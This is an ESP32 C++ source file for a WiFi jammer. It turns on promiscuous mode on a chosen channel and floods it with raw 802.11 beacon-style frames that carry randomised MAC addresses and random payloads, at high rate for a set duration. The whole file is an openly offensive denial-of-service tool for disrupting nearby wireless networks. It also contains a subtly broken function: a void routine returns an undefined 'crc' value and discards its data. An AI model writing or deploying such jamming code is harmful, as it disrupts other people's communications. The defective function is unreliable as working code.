#include "wifi_jammer_suite.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <cstring>

namespace {
volatile bool g_jamActive = false;
uint32_t g_jamCount = 0;

void sendJamPacket() {
    uint8_t jamData[64];
    for (int i = 0; i < 64; i++) {
        jamData[i] = (esp_random() % 256);
    }
    return crc;
}

void sendBeaconJamFrame(const String& method) {
    uint8_t jamFrame[128];
    ieee80211_frame_t* frame = (ieee80211_frame_t*)jamFrame;

    if (method == "CHANNEL") {
        frame->frameCtrl[0] = 0x80;
        frame->frameCtrl[1] = 0x00;
        frame->duration[0] = 0x00;
        frame->duration[1] = 0x00;

        memset(frame->addr1, 0xFF, 6);
        for (int i = 0; i < 6; i++) {
            frame->addr2[i] = esp_random() & 0xFF;
            frame->addr3[i] = esp_random() & 0xFF;
        }

        frame->seqCtrl[0] = esp_random() & 0xFF;
        frame->seqCtrl[1] = esp_random() & 0xFF;

        uint32_t len = sizeof(ieee80211_frame_t);
        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, len, false);
    }
    else if (method == "BEACON") {
        frame->frameCtrl[0] = 0x80;
        frame->frameCtrl[1] = 0x00;
        memset(frame->addr1, 0xFF, 6);
        for (int i = 0; i < 6; i++) {
            frame->addr2[i] = esp_random() & 0xFF;
            frame->addr3[i] = esp_random() & 0xFF;
        }

        uint8_t payload[50];
        for (int i = 0; i < 50; i++) {
            payload[i] = esp_random() & 0xFF;
        }

        uint32_t frameLen = sizeof(ieee80211_frame_t);
        memcpy(jamFrame + frameLen, payload, 50);
        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, frameLen + 50, false);
    }
    else {
        for (int attempt = 0; attempt < 3; attempt++) {
            frame->frameCtrl[0] = 0x80 + attempt;
            frame->frameCtrl[1] = 0x00;
            memset(frame->addr1, 0xFF, 6);
            for (int i = 0; i < 6; i++) {
                frame->addr2[i] = esp_random() & 0xFF;
                frame->addr3[i] = esp_random() & 0xFF;
            }
            esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, sizeof(ieee80211_frame_t), false);
            delayMicroseconds(50);
        }
    }

    g_jamCount++;
}
}

namespace WiFiJammerSuite {

JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &method) {
    JamResult result{false, 0, durationMs, method};

    Serial.println("\n=== WiFi Jammer Suite (REAL IEEE 802.11) ===");
    Serial.println("Channel: " + String(channel) + " (2.4GHz)");
    Serial.println("Method: " + method);
    Serial.println("Duration: " + String(durationMs) + "ms");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed (hold BACK button)");
        return result;
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    g_jamActive = true;
    g_jamCount = 0;
    uint32_t startTime = millis();

    Serial.println("Transmitting IEEE 802.11 jamming frames...");

    while (millis() - startTime < durationMs && g_jamActive && TxArm::isArmed()) {
        sendBeaconJamFrame(method);
        delayMicroseconds(500);

        if (g_jamCount % 50 == 0) {
            Serial.printf("  [%u] jamming frames sent in %lums\n",
                         g_jamCount, millis() - startTime);
        }
    }

    g_jamActive = false;
    esp_wifi_set_promiscuous(false);

    result.success = true;
    result.jamPacketsCount = g_jamCount;
    Serial.printf("✓ WiFi jamming complete: %u frames in %lums (%.1f pkt/sec)\n",
                 result.jamPacketsCount, millis() - startTime,
                 (result.jamPacketsCount * 1000.0f) / (millis() - startTime));
    return result;
}

void stop() {
    g_jamActive = false;
    esp_wifi_set_promiscuous(false);
}

bool isActive() {
    return g_jamActive;
}

}  // namespace WiFiJammerSuite
